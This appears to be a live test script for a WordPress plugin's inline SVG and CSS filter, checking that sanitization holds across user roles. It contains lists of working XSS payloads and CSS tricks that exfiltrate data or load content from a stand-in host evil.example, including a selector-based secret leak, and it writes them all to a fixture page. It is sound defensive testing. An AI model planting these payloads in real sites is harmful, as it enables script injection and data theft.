#!/usr/bin/env python3
"""
Live checks for the inline SVG and style opt-in (1.15.0), driven by
inline-markup-live.sh (env: BASE, SVC, KEY, OWNER_BEFORE, PW_ADMIN, PW_EDITOR, PW_AUTHOR,
OAUTH_TOKEN, FIXTURE, FIXTURE_AUTHOR). Real kses and real Elementor. It leaves the fixture
page holding every hostile payload and prints its URL, for the browser check. Exit 1 on
any failure.
"""
import base64, json, os, re, subprocess, sys, urllib.error, urllib.request

BASE = os.environ['BASE'].rstrip('/')
MSG = BASE + '/wp-json/iato-mcp/v1/message'
SVC = os.environ.get('SVC', 'cli')
FX = json.loads(os.environ['FIXTURE'])
PAGE, HTML, H, ED = int(FX['page_id']), FX['ids']['html'], FX['ids']['heading'], FX['ids']['editor']
FXA = json.loads(os.environ['FIXTURE_AUTHOR'])
A_PAGE, A_HTML = int(FXA['page_id']), FXA['ids']['html']
GOOD = '<style>.iato-box > .inner{color:rgb(1, 2, 3)}</style><svg class="iato-svg" viewBox="0 0 24 24" width="24" height="24"><title>Icon</title><g fill="none"><path d="M0 0L24 24" stroke="red"/><rect x="1" y="1" width="2" height="2"/><circle cx="5" cy="5" r="1"/><line x1="0" y1="0" x2="1" y2="1"/><polyline points="0,0 1,1"/><polygon points="0,0 1,1 2,0"/></g></svg><div class="iato-box"><span class="inner">styled</span></div>'
passes, fails = 0, []


def record(name, ok, detail=None):
    global passes
    if ok:
        passes += 1; print(f'  PASS  {name}')
    else:
        fails.append(name); print(f'  FAIL  {name}: {json.dumps(detail, default=str)[:900]}')


def wp(*args, user=None):
    cmd = ['npx', '@wordpress/env', 'run', SVC, 'wp', *args]
    if user:
        cmd.append(f'--user={user}')
    r = subprocess.run(cmd, capture_output=True, text=True, stdin=subprocess.DEVNULL)
    return '\n'.join(l for l in r.stdout.splitlines() if l and not l.startswith(('ℹ', '✔'))).strip()


def auth(who):
    if who == 'key':
        return 'Bearer ' + os.environ['KEY']
    if who == 'oauth':
        return 'Bearer ' + os.environ['OAUTH_TOKEN']
    login = {'admin': 'admin', 'editor': 'inlineeditor', 'author': 'inlineauthor'}[who]
    return 'Basic ' + base64.b64encode(f"{login}:{os.environ['PW_' + who.upper()]}".encode()).decode()


def call(tool, args, who='oauth'):
    body = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call', 'params': {'name': tool, 'arguments': args}}
    req = urllib.request.Request(MSG, data=json.dumps(body).encode(), method='POST', headers={'Content-Type': 'application/json', 'Authorization': auth(who)})
    try:
        raw = urllib.request.urlopen(req, timeout=120).read()
    except urllib.error.HTTPError as e:
        raw = e.read()
    r = json.loads(raw)
    if 'error' in r:
        return {'error': r['error']}
    res = r['result']; text = res['content'][0]['text']
    if res.get('isError'):
        return {'isError': True, 'text': text}
    return json.loads(text)


def stored(pid, wid, key='html'):
    tree = json.loads(wp('post', 'meta', 'get', str(pid), '_elementor_data'))
    stack = list(tree)
    while stack:
        el = stack.pop()
        if el.get('id') == wid:
            return el['settings'].get(key)
        stack.extend(el.get('elements', []))
    return None


def write(html, who='oauth', pid=PAGE, wid=HTML, **extra):
    return call('set_widget_setting', {'id': pid, 'widget_id': wid, 'key': 'html', 'value': html, **extra}, who)


def entry(r, wid=HTML):
    for e in r.get('sanitized_report', []):
        if e['path'] == f'{wid}/settings/html':
            return e
    return {}


def setting(on):
    wp('option', 'update', 'iato_mcp_inline_markup_enabled', '1' if on else '0')


def has_real_tag(html, tag):
    return re.search(r'<\s*' + tag + r'[\s>/]', html, re.I) is not None


# ── Off ────────────────────────────────────────────────────────────────────
print('# setting off (the default)')
wp('option', 'delete', 'iato_mcp_inline_markup_enabled')
r = write(GOOD)
s = stored(PAGE, HTML)
e = entry(r)
record('style and svg are stripped', not has_real_tag(s, 'style') and not has_real_tag(s, 'svg'), s)
record('sanitized stays, with the path', r.get('sanitized') is True and f'{HTML}/settings/html' in r.get('sanitized_paths', []), r)
record('the report names the tags', e.get('removed_tags') == ['style', 'svg', 'g', 'path', 'rect', 'circle', 'line', 'polyline', 'polygon'], e)
record('the report says the setting did it', e.get('inline_markup') == 'stripped_setting_off' and 'Allow inline SVG' in e.get('note', ''), e)
record('the report warns about visible CSS text', 'visible text' in e.get('note', ''), e)
r = write(GOOD, dry_run=True)
record('a dry run reports the same', entry(r).get('inline_markup') == 'stripped_setting_off' and r.get('dry_run') is True, r)

# ── On, every credential ───────────────────────────────────────────────────
print('# setting on')
setting(True)
for who in ('oauth', 'key', 'admin'):
    write('<p>reset</p>', who)
    r = write(GOOD, who)
    s = stored(PAGE, HTML)
    e = entry(r)
    record(f'{who}: style and the svg subset are kept', has_real_tag(s, 'style') and has_real_tag(s, 'svg') and all(has_real_tag(s, t) for t in ('path', 'rect', 'circle', 'line', 'polyline', 'polygon', 'title', 'g')), s)
    record(f'{who}: CSS selectors survive unencoded', '.iato-box > .inner' in s, s)
    record(f'{who}: the report says kept', e.get('inline_markup') == 'kept' and 'style' in e.get('kept_tags', []) and 'svg' in e.get('kept_tags', []) and e.get('removed_tags') == [] and e.get('removed_attributes') == [], e)
html = urllib.request.urlopen(wp('post', 'url', str(PAGE)), timeout=60).read().decode()
record('the visitor page has the style block and the svg', '.iato-box > .inner{color:rgb(1, 2, 3)}' in html and 'class="iato-svg"' in html, html[:300])
content = wp('post', 'get', str(PAGE), '--field=post_content')
record('the CSS is not left as text in post_content', 'iato-box > .inner' not in content and '&gt; .inner' not in content, content[:400])
r = write(GOOD, dry_run=True)
record('a dry run says kept too', entry(r).get('inline_markup') == 'kept', r)

print('# the lock stays on')
cap = wp('eval', 'wp_set_current_user(1); echo current_user_can("unfiltered_html") ? "1" : "0";')
record('setup: admin holds unfiltered_html on this site', cap == '1', cap)
r = call('set_widget_setting', {'id': PAGE, 'widget_id': H, 'key': 'title', 'value': '<b>ok</b><svg></svg><style>a{}</style>'}, 'oauth')
t = stored(PAGE, H, 'title')
record('a heading gets no svg or style', not has_real_tag(t, 'svg') and not has_real_tag(t, 'style') and '<b>ok</b>' in t, t)
record('...and no inline_markup claim', 'inline_markup' not in (r.get('sanitized_report') or [{}])[0], r)
r = call('update_elementor_widget', {'id': PAGE, 'widget_id': ED, 'settings_patch': {'editor': '<p>x</p><svg></svg>'}}, 'oauth')
record('a text editor gets no svg', not has_real_tag(stored(PAGE, ED, 'editor'), 'svg'), stored(PAGE, ED, 'editor'))
r = call('update_post', {'id': PAGE, 'excerpt': 'x'}, 'oauth')
r = call('create_post', {'title': 'inline-live post', 'content': '<p>a</p><style>a{}</style><svg></svg>', 'status': 'draft'}, 'oauth')
rc = r.get('sanitized_report', [])
record('create_post keeps filtering and reports it', r.get('sanitized') is True and rc and rc[0]['path'] == 'content' and 'style' in rc[0]['removed_tags'] and 'svg' in rc[0]['removed_tags'], r)
wp('post', 'delete', str(r.get('id')), '--force')
r = call('update_post_meta', {'id': PAGE, 'key': 'inline_live', 'value': {'a': '<svg></svg><p>x</p>'}}, 'oauth')
record('array meta keeps filtering and reports it', r.get('sanitized') is True and r['sanitized_report'][0]['removed_tags'] == ['svg'], r)
wp('post', 'meta', 'delete', str(PAGE), 'inline_live')
r = call('update_post_meta', {'id': PAGE, 'key': 'inline_live', 'value': '<svg></svg>plain'}, 'oauth')
record('string meta reports what it stripped', r.get('sanitized') is True and r['sanitized_report'][0]['rule'] == 'text', r)
wp('post', 'meta', 'delete', str(PAGE), 'inline_live')

print('# who it does not apply to')
wp('option', 'update', 'iato_mcp_key_owner', '0')
try:
    r = write(GOOD + ' unbound', 'key')
    record('an unbound site key: stripped, no capability', entry(r).get('inline_markup') == 'stripped_no_capability' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)
finally:
    wp('option', 'update', 'iato_mcp_key_owner', os.environ['OWNER_BEFORE'])
r = write(GOOD + ' editor', 'editor')
record('an editor (holds unfiltered_html, not manage_options): stripped', entry(r).get('inline_markup') == 'stripped_no_capability' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)
r = write('<svg></svg><p>author</p>', 'author', A_PAGE, A_HTML)
record('an author: stripped', entry(r, A_HTML).get('inline_markup') == 'stripped_no_capability' and not has_real_tag(stored(A_PAGE, A_HTML), 'svg'), r)

# ── Hostile input, one at a time, all as an administrator with the setting on ──
print('# hostile input (stored value)')
FORBIDDEN = re.compile(r'<script|on(error|load|click|mouseover)\s*=|javascript:|foreignobject|<use|<image|<animate|<set\b|xlink:href', re.I)
HOSTILE = {
    'attribute holding style text': '<img alt="<style>" src=x onerror=alert(1) x="</style>"><style>a{}</style>',
    'style breakout': '<style>a{}</style><script>alert(1)</script><img src=x onerror=alert(2)>',
    'closing style in the body': '<style>a{}</style ><script>alert(3)</script></style>',
    'script in svg': '<svg><script>alert(4)</script><path d="M0"/></svg>',
    'event handlers on svg': '<svg onload="alert(5)"><circle r="1" onclick="alert(6)"/></svg>',
    'foreignObject': '<svg><foreignObject><img src=x onerror=alert(7)></foreignObject></svg>',
    'xlink and use and image': '<svg><a xlink:href="javascript:alert(8)"><path d="M0"/></a><use href="#x"/><image href="x.png" onerror="alert(9)"/></svg>',
    'animate': '<svg><animate attributeName="href" to="javascript:alert(10)"/><set attributeName="onmouseover" to="alert(11)"/></svg>',
    'markup inside style inside svg': '<svg><style><img src=x onerror=alert(12)></style></svg>',
    'attributes on style': '<style onload="alert(13)" media="print">a{}</style>',
    'quote in media': '<style media="x&quot; onload=&quot;alert(14)">a{}</style>',
    'namespace confusion': '<svg></p><style><a title="</style><img src=x onerror=alert(15)>">',
    'title holding a closing tag in an attribute': '<title><a href="</title><img src=x onerror=alert(16)>">x</a></title><svg></svg>',
    'title inside svg': '<svg><title><img src=x onerror=alert(17)></title></svg>',
    'comment': '<!-- <style>x</style> --><style>a{}</style><svg></svg><!-- --><img src=x onerror=alert(18)>',
    'unclosed style': '<svg></svg><style>a{}<img src=x onerror=alert(19)>',
    'upper case': '<SVG ONLOAD="alert(20)"></SVG><STYLE>a{}</STYLE>',
    'data url in anchor': '<svg></svg><a href="data:text/html,<script>alert(21)</script>">x</a>',
    'javascript in style': '<style>a{background:url(javascript:alert(22))}</style><svg></svg>',
}
# Each of these made a browser request evil.example from an earlier version of the filter.
OFF_SITE = {
    'unterminated url': '<style>body{background:url(https://evil.example/A.png</style>',
    'unterminated quoted url': '<style>body{background:url("https://evil.example/M.png</style>',
    'import rejoined': '<style>@im@import x;port "https://evil.example/B.css";</style>',
    'text url( as a shield': '<style>.s1{--x:"url(";background:url(https://evil.example/C.png)}</style><div class="s1">s</div>',
    'unterminated image-set': '<style>.s2{background-image:image-set("https://evil.example/E.png" 1x</style><div class="s2">s</div>',
    'parens in a filename': '<style>.s3{background-image:image-set("https://evil.example/F(a(b)c).png" 1x)}</style><div class="s3">s</div>',
    'var indirection': '<style>.s4{--u:"https://evil.example/G.png";background-image:image-set(var(--u) 1x)}</style><div class="s4">s</div>',
    'if indirection': '<style>.s5{background-image:image-set(if(style(--a:1):"https://evil.example/X6.png";else:"y") 1x)}</style><div class="s5" style="--a:1">s</div>',
    'nested image-set': '<style>.s6{background-image:image-set("https://evil.example/N.png" 1x, linear-gradient(rgb(0,0,0),red) 2x)}</style><div class="s6">s</div>',
    'off-site font': '<style>@font-face{font-family:evilf;src:url(https://evil.example/f.woff)}.s7{font-family:evilf}</style><div class="s7">s</div>',
    'character reference in svg style': '<svg><style>@&#105;mport "https://evil.example/ref.css";</style></svg>',
    'reference in url in svg style': '<svg><style>.s8{fill:ur&#108;(https://evil.example/ref.svg#a)}</style><rect class="s8" width="9" height="9"/></svg>',
    'selector exfiltration': '<input class="s9" name="secret" value="s"><style>input[name=secret][value^="s"]{--x:"url(";background:url(https://evil.example/leak?prefix=s)}</style>',
    'escaped url in svg paint': '<svg width="9" height="9"><rect width="9" height="9" fill="u\\72l(https://evil.example/I.svg#p)"/></svg>',
    'escaped url in svg stroke': '<svg width="9" height="9"><rect width="9" height="9" stroke="\\75rl(https://evil.example/J.svg#p)"/></svg>',
}
for name, payload in HOSTILE.items():
    r = write(payload)
    s = stored(PAGE, HTML) or ''
    # Text kses encoded (&lt;img ...) is inert: only look at what is still markup.
    markup = re.sub(r'&lt;.*?&gt;', '', s)
    record(f'{name}: nothing executable stored', not FORBIDDEN.search(markup), s)

print('# off-site references (stored value)')
for name, payload in OFF_SITE.items():
    r = write(payload)
    s = stored(PAGE, HTML) or ''
    # What a browser would still fetch is checked for real in the browser step.
    record(f'{name}: nothing off-site stored as a live reference', not re.search(r'url\(\s*["\']?\s*https?://evil|@import|image-set\([^)]*evil|ur&#108;|&#105;|u\\+72l|\\+75rl', s), s)

VAR_CHAIN = '<div style="--x:url(https://evil.example/V1.svg#p)"><svg width="100" height="100"><rect width="100" height="100" fill="var(--x)"/></svg></div>'
r = write(VAR_CHAIN)
record('an off-site url() in a style attribute fails the value: no kept svg can reach it', entry(r).get('inline_markup') == 'stripped_unsafe' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)
r = write('<svg><rect fill="var(--brand)" stroke="currentColor"/></svg><div style="--brand:red">x</div>')
record('...while a var() that names no other site stays', entry(r).get('inline_markup') == 'kept' and 'var(--brand)' in stored(PAGE, HTML), r)

print('# style bodies')
r = write('<style>@import url(https://evil.example/x.css);a{background:url(https://evil.example/a.png)}b{background:url(/ok.png)}c{fill:url(#f)}</style><svg></svg>')
s = stored(PAGE, HTML); e = entry(r)
record('@import and off-site url() go, the rest stays', '@import' not in s and 'evil.example' not in s and 'url(/ok.png)' in s and 'url(#f)' in s, s)
record('the report lists what went from the CSS', e.get('removed_css') == ['@import url(https://evil.example/x.css);', 'url(https://evil.example/a.png)'], e)
r = write('<style>.x{background:url(' + BASE + '/ok.png)}</style><svg></svg>')
record('a url on this site stays', BASE + '/ok.png' in stored(PAGE, HTML), stored(PAGE, HTML))
r = write('<svg><rect fill="url(https://evil.example/x.svg#a)"/></svg><style>a{}</style>')
record('an off-site paint server fails the value: it falls back to the plain rule', entry(r).get('inline_markup') == 'stripped_unsafe' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)

# ── Keeping what is there ──────────────────────────────────────────────────
print('# later writes')
write(GOOD)
setting(False)
r = call('set_widget_setting', {'id': PAGE, 'widget_id': H, 'key': 'title', 'value': 'A later edit'}, 'oauth')
record('setting off later: a write to another widget leaves the stored svg alone', has_real_tag(stored(PAGE, HTML), 'svg') and has_real_tag(stored(PAGE, HTML), 'style'), stored(PAGE, HTML))
r = write(GOOD)
record('...until that widget itself is written', not has_real_tag(stored(PAGE, HTML), 'svg'), r)
setting(True)
r = write(GOOD)
rid = r['change_receipt']['change_id']
write('<p>replaced</p>')
wp('option', 'delete', 'iato_mcp_inline_markup_enabled')

# Everything hostile at once, plus the good markup, for the browser check.
setting(True)
wid_page_html = GOOD + ''.join(HOSTILE.values())
r = write(GOOD)
tree = json.loads(wp('post', 'meta', 'get', str(PAGE), '_elementor_data'))
container = tree[0]
for i, payload in enumerate(list(HOSTILE.values()) + list(OFF_SITE.values()) + [VAR_CHAIN]):
    container['elements'].append({'id': f'hst{i:04d}', 'elType': 'widget', 'widgetType': 'html', 'settings': {'html': payload}, 'elements': []})
r = call('update_elementor_data', {'id': PAGE, 'elementor_data': json.dumps(tree)}, 'oauth')
record('all payloads written together', r.get('success') is True, r)
print('BROWSER_URL=' + wp('post', 'url', str(PAGE)))

print(f'\n# {passes} passed, {len(fails)} failed')
if fails:
    print('# failed: ' + '; '.join(fails))
sys.exit(1 if fails else 0)
